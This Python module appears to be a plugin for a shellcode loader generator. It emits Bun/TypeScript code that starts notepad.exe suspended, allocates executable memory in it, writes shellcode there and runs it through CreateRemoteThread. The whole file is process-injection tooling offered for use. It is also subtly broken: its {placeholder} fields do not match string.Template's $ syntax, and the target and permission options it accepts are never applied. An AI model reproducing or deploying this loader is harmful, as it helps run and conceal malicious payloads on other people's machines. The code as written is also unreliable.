from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ['import Kernel32 from "@bun-win32/kernel32";', 
                'import { ptr } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection, ProcessCreationFlags } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return []

    def template(self) -> str:
        return Template("""
    {transformers}
    
    const si = new Uint8Array(104);
    new DataView(si.buffer).setUint32(0, 104, true);
    const pi = new Uint8Array(24);
    const cmdline = Buffer.from('C:\\\\windows\\\\system32\\\\notepad.exe\\0', 'utf8');

    Kernel32.CreateProcessA(null, ptr(cmdline), null, null, 0, ProcessCreationFlags.CREATE_SUSPENDED, null, null, ptr(si), ptr(pi));

    const view = new DataView(pi.buffer);
    const hProcess = view.getBigUint64(0, true);

    const address = Kernel32.VirtualAllocEx(hProcess, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
    Kernel32.WriteProcessMemory(BigInt(hProcess), address, ptr(shellcode), {shellcodeSize}n, null);
    
    const hThread = Kernel32.CreateRemoteThread(hProcess, null, 0, address, 0, 0, null);
    Kernel32.WaitForSingleObject(hThread, 500);
    Kernel32.CloseHandle(hThread);

""").substitute(target=self.target, memoryPermission=self.memoryPermission)